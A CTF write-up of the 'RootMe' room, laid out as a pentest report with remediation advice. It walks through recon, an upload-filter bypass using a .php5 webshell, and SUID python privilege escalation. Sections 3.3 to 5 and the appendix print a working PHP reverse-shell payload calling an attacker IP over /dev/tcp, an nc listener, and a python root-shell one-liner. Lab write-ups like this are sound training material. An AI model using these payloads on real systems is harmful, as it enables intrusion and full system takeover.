# RootMe — CTF Writeup — File Upload Exploit, Reverse Shell, and Privilege Escalation

## 1. Engagement Overview
- **Title / Project Name:** RootMe (CTF room)
- **Author:** Myself
- **Date:** Old
- **Objective:** Obtain user and root flags via web application file upload vulnerability and local privilege escalation.
- **Scope / Target:** `10.10.183.212`
- **Testing Window:** CTF box
- **Tools Used:** nmap, gobuster, curl, nc, python, web browser, basic unix utilities, GTFOBins reference
- **Methodology Reference:** Recon → Enumeration → Exploitation → Post-exploitation → Cleanup

## 2. Short Summary
Discovered HTTP and SSH services. Found an upload panel that allowed bypassing file-type restrictions by using alternate PHP extensions. Uploaded a webshell (`.php5`) to trigger a reverse shell. Obtained the user flag from the webserver filesystem. On the box, discovered a SUID `python2.7` binary; used a GTFOBins-style exploitation to spawn a root shell and read the root flag.

## 3. Methodology / Process Flow

### 3.1 Reconnaissance
- Performed TCP SYN scan to discover open ports.
- Identified services running on discovered ports (SSH, HTTP).

**Commands**
```
nmap -sS 10.10.183.212
```

**Key output (summary)**
- `22/tcp` — ssh (OpenSSH 8.2p1 Ubuntu)
- `80/tcp` — http (Apache httpd 2.4.41 reported; note: challenge expects 2.4.29)

### 3.2 Enumeration
- Service/version enumeration on ports 22 and 80.
- Directory enumeration of the webserver to find hidden endpoints and upload functionality.

**Commands**
```
nmap -sC -sV -p 22,80 10.10.183.212
gobuster dir -u http://10.10.183.212 -w /usr/share/wordlists/dirb/common.txt
```

**Important findings**
- HTTP title: `HackIT - Home`
- Discovered directories: `/.hta`, `/.htpasswd`, `/.htaccess`, `/css/`, `/index.php`, `/js/`, `/panel/`, `/server-status`, `/uploads/`
- `/panel/` discovered and observed to provide a file upload feature.

### 3.3 Exploitation
- Confirmed file upload restrictions blocked `.php` but allowed alternate PHP extensions such as `.php5` or `.phtml`.
- Crafted a reverse shell webshell using `.php5` and uploaded it to `/uploads/`.
- Set up a netcat listener and triggered the webshell to receive a reverse shell.

**Payload (webshell)**
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.201.59.141/4444 0>&1'"); ?>
```

**Listener**
```
nc -lvnp 4444
```

**Trigger**
Access `http://10.10.183.212/uploads/shell.php5` from a browser or curl to execute the payload and receive the reverse shell.

**Result**
Reverse shell connection established to attacker listener.

### 3.4 Post-Exploitation
- Upgraded the interactive shell to a tty for stability:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
- Searched filesystem for user flag and read it:
```
find / -type f -name "user.txt" 2>/dev/null
cat /var/www/user.txt
# => (user flag)
```
- Enumerated SUID binaries to find privilege escalation vectors:
```
find / -perm -4000 -type f 2>/dev/null
```
- Observed `/usr/bin/python2.7` listed with SUID bit set.

### 3.5 Persistence / Cleanup
- (CTF best practice) Removed uploaded webshell and any tools uploaded to the target after capture, if applicable.
- Restored any modified files / cleared logs as appropriate for lab environment (documented cleanup performed).

## 4. Findings Summary
| ID | Vulnerability / Issue | Severity | Impact | Recommendation |
|----|------------------------|----------:|--------|----------------|
| 1 | File upload validation bypass (allowed alternative PHP extensions) | High | Remote code execution / initial access via web | Enforce strict server-side file-type validation, whitelist safe extensions, validate file contents, and run uploads in isolated environment |
| 2 | SUID `python2.7` binary present | High | Local privilege escalation to root via GTFOBins technique | Remove SUID bit from interpreters or restrict SUID to vetted, necessary binaries; patch/remove unsupported SUID scripts |
| 3 | Webserver leaking version information / non-secure cookie flags | Medium | Information disclosure | Harden server headers and set appropriate cookie flags (HttpOnly, Secure) |

## 5. Technical Details

### Finding 1 — File upload bypass allowing webshell execution
- **Description:** Upload panel accepted alternate PHP extensions (`.php5`) allowing upload and execution of server-side code.
- **Impact:** Allows unauthenticated remote command execution in the context of the web server user (www-data), enabling initial foothold.
- **Evidence (commands / outputs):**
  - `gobuster` found `/panel/` and `/uploads/`.
  - Uploaded `shell.php5` and accessed `http://10.10.183.212/uploads/shell.php5` to trigger reverse shell.
  - Reverse shell connection received on attacker listener.
- **Recommendation:** Implement server-side checks to reject any executable server-side code, enforce whitelist on uploaded file types, store uploads outside webroot, and scan uploaded content for magic bytes and shebangs.

### Finding 2 — SUID `python2.7` allows privilege escalation
- **Description:** `python2.7` executable has SUID bit set which allows privilege escalation when abused with known techniques (GTFOBins).
- **Impact:** Local user can escalate to root privileges; complete system compromise possible.
- **Evidence (commands / outputs):**
  - `find / -perm -4000 -type f 2>/dev/null` returned `/usr/bin/python2.7`.
  - Executed:
    ```bash
    python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
    ```
    and obtained a root shell.
- **Recommendation:** Remove SUID from interpreters like Python unless explicitly required and audited. Use stricter file permissions and audit SUID/SGID binaries regularly.

## 6. Remediation Plan
- **High Priority:** Remove or restrict SUID bit on `/usr/bin/python2.7`. Investigate why SUID is present and remove unless absolutely necessary. Implement least privilege on system binaries.
- **High Priority:** Harden file upload handling:
  - Enforce server-side content-type and extension validation.
  - Block execution of uploaded files by placing uploads outside webroot or disabling execution (e.g., using `php_admin_flag engine Off` in upload directories).
  - Scan uploads for typical webshell signatures and disallow known patterns.
- **Medium Priority:** Harden web server headers and cookie flags. Disable unnecessary server information leaking.
- **Low Priority:** Conduct a review of web application functionality that permits direct file drops and implement rate limits, authentication, and logging/alerting on suspicious uploads.

## 7. Appendices
**Tool outputs / commands used**
```
# Recon
nmap -sS 10.10.183.212

# Service enumeration
nmap -sC -sV -p 22,80 10.10.183.212

# Directory discovery
gobuster dir -u http://10.10.183.212 -w /usr/share/wordlists/dirb/common.txt

# Webshell (uploaded as .php5)
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.201.59.141/4444 0>&1'"); ?>

# Listener
nc -lvnp 4444

# Shell stabilization
python -c 'import pty; pty.spawn("/bin/bash")'

# Search for flags
find / -type f -name "user.txt" 2>/dev/null
cat /var/www/user.txt

# Enumerate SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Exploit SUID python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Read root flag
find / -type f -name "root.txt" 2>/dev/null
cat /root/root.txt
```

---

